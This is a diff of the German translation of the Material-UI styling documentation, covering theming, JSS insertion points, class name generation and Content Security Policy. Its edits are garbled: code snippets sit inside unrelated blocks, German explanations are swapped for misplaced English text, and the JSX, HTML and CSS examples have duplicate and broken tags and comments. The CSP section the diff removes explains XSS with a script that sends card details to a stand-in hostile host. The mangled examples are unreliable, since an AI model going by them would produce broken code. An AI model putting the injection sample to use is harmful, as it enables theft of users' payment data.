@@ -4,7 +4,7 @@
 
 ## Theming
 
-Add a `ThemeProvider` to the top level of your app to pass a theme down the React component tree. Anschließend können Sie in den Stilfunktionen auf das Designobjekt zugreifen.
+Sie können das äußere Theme erweitern, indem Sie eine Funktion bereitstellen: Das innere Theme ** überschreibt** das äußere Theme.
 
 > This example creates a theme object for custom-built components. If you intend to use some of the Material-UI's components you need to provide a richer theme structure using the `createMuiTheme()` method. Head to the the [theming section](/customization/theming/) to learn how to build your custom Material-UI theme.
 
@@ -236,7 +236,10 @@ import { StylesProvider } from '@material-ui/core/styles';
 
 <StylesProvider injectFirst>
   {/* Your component tree.
-      Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben. */}
+      import { StylesProvider } from '@material-ui/core/styles';
+
+<StylesProvider injectFirst>
+  {/* Your component tree. */}
 </StylesProvider>
 ```
 
@@ -269,9 +272,10 @@ export default function MyComponent() {
   const className = clsx(classes.root, classesBase.root)
 
   // color: red 🔴 wins.
-  return <div className={className} />;
-}
+  Sie müssen die <code>Klassen</code> Eigenschaft einer Komponente verwenden, um die Styles zu überschreiben.
 ```
+ Eigenschaft einer Komponente verwenden, um die Styles zu überschreiben.
+</code>
 
 Die Hook-Aufrufreihenfolge und die Klassennamensverkettungsreihenfolge **spielen keine Rolle**.
 
@@ -285,8 +289,8 @@ Am einfachsten ist es, einen HTML-Kommentar zum `<head>` hinzuzufügen, der best
 
 ```html
 <head>
-  <!-- jss-insertion-point -->
-  <link href="...">
+  <noscript id="jss-insertion-point" />
+  <link href="..." />
 </head>
 ```
 
@@ -307,12 +311,13 @@ export default function App() {
 
 #### Other HTML elements
 
-[Create React App](https://github.com/facebook/create-react-app) entfernt HTML-Kommentare beim Erstellen des Produktions-Builds. Um dieses Problem zu umgehen, können Sie ein DOM-Element (nicht einen Kommentar) als JSS-Einfügepunkt angeben, z. B. `<noscript>`:
+The way that you do this is by passing a `<meta property="csp-nonce" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.
 
 ```jsx
 <head>
-  <noscript id="jss-insertion-point" />
-  <link href="..." />
+  <!-- jss-insertion-point -->
+  <link href="...">
+</head> />
 </head>
 ```
 
@@ -323,12 +328,12 @@ import { StylesProvider, jssPreset } from '@material-ui/core/styles';
 const jss = create({
   ...jssPreset(),
   // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
-  insertionPoint: document.getElementById('jss-insertion-point'),
-});
+  import { create } from 'jss';
+import { StylesProvider, jssPreset } from '@material-ui/core/styles';
 
-export default function App() {
-  return <StylesProvider jss={jss}>...</StylesProvider>;
-}
+const jss = create({
+  ...jssPreset(),
+  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
 ```
 
 #### JS createComment
@@ -397,7 +402,7 @@ Siehe [dieses Beispielprojekt](https://github.com/mui-org/material-ui/blob/next/
 
 ## Klassennamen
 
-Die Klassennamen werden von dem [Klassennamengenerator](/styles/api/#creategenerateclassname-options-class-name-generator) generiert. Nehmen wir den folgenden Stil als Beispiel.
+Die Klassennamen werden von dem [Klassennamengenerator](/styles/api/#creategenerateclassname-options-class-name-generator) generiert.
 
 ### Standard
 
@@ -457,21 +462,55 @@ const useStyles = makeStyles({
     '&:hover': { /* … */ },
   },
   disabled: {},
-}, { name: 'MuiButton' });
+}, { name: 'MuiButton' }); */
+    },
+    label: {
+      /* … */
+    },
+    outlined: {
+      /* … */
+      '&$disabled': {
+        /* … */
+      },
+    },
+    outlinedPrimary: {
+      /* … */
+      '&:hover': {
+        /* … */
+      },
+    },
+    disabled: {},
+  },
+  { name: 'MuiButton' },
+);
 ```
 
 generiert die folgenden Klassennamen, die Sie überschreiben können:
 
 ```css
-.MuiButton-root { /* … */ }
+.MuiButton-root {
+  /* … */
+}
+.MuiButton-label {
+  /* … */
+}
+.MuiButton-outlined {
+  /* … .MuiButton-root { /* … */ }
 .MuiButton-label { /* … */ }
 .MuiButton-outlined { /* … */ }
 .MuiButton-outlined.Mui-disabled { /* … */ }
 .MuiButton-outlinedPrimary: { /* … */ }
-.MuiButton-outlinedPrimary:hover { /* … */ }
+.MuiButton-outlinedPrimary:hover { /* … */ } */
+}
+.muibutton-outlinedprimary: {
+  /* … */
+}
+.MuiButton-outlinedPrimary:hover {
+  /* … */
+}
 ```
 
-*Dies ist eine Vereinfachung des `@material-ui/core/Button` Stylesheet der Komponente.*
+_Dies ist eine Vereinfachung des `@material-ui/core/Button` Stylesheet der Komponente._
 
 Die Anpassung des TextFields kann mit der [ `classes-`API ](#overriding-styles-classes-prop) mühsam sein, wo Sie die classes Eingenschaft definieren müssen. Die Standardwerte sind, wie oben beschrieben, einfacher zu verwenden. Zum Beispiel:
 
@@ -516,60 +555,3 @@ Sie können auch JSS-generierte Klassennamen mit globalen Namen kombinieren.
 ## CSS-Präfix
 
 JSS verwendet Featureerkennung, um die korrekten Präfixe anzuwenden. [Seien Sie nicht überrascht](https://github.com/mui-org/material-ui/issues/9293) wenn Sie in der neuesten Version von Chrome kein bestimmtes Präfix sehen können. Ihr Browser benötigt es wahrscheinlich nicht.
-
-## Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)
-
-### Was ist CSP und warum ist es nützlich?
-
-Grundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zurückgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen für XSS anfälligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, könnte ein Angreifer Folgendes eingeben:
-
-```html
-<script>
-  sendCreditCardDetails('https://hostile.example');
-</script>
-```
-
-Diese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.
-
-Weitere Informationen zu CSP finden Sie in den [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
-
-### Wie kann man CSP implementieren?
-
-Um CSP mit Material-UI (und JSS) verwenden zu können, müssen Sie eine Nonce verwenden. Eine Nonce ist eine zufällig generierte Zeichenfolge, die nur einmal verwendet wird. Daher müssen Sie eine Server-Middleware hinzufügen, um für jede Anforderung eine zu generieren. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie für einen grundlegenden Überblick weiter.
-
-Eine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie können so erstellen:
-
-```js
-import uuidv4 from 'uuid/v4';
-
-const nonce = new Buffer(uuidv4()).toString('base64');
-```
-
-Es ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header könnte mit der angewendeten Nonce so aussehen:
-
-```js
-header('Content-Security-Policy')
-  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
-```
-
-Wenn Sie Server Side-Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers übergeben.
-
-```jsx
-<style
-  id="jss-server-side"
-  nonce={nonce}
-  dangerouslySetInnerHTML={{ __html: sheets.toString() }}
-/>
-```
-
-Dann müssen Sie dieses Nonce an JSS übergeben, damit es den nachfolgenden `<style>`-Tags hinzugefügt werden kann.
-
-The way that you do this is by passing a `<meta property="csp-nonce" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.
-
-Sie müssen diesen Header unabhängig davon angeben, ob SSR verwendet wird oder nicht. Here is an example of what a fictional header could look like:
-
-```html
-<head>
-  <meta property="csp-nonce" content="this-is-a-nonce-123" />
-</head>
-```
